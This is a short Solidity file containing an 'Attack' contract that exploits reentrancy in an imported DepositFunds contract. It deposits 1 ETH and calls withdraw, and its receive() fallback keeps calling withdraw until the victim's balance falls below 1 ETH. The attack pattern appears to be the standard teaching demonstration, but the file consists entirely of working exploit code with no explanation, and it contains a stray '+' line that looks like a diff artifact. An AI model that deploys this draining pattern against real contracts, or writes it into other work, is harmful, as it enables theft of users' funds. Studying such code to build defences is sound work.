// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./DepositFunds.sol";

contract Attack {
    DepositFunds public depositFunds;
    uint public count;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    receive() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
+
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}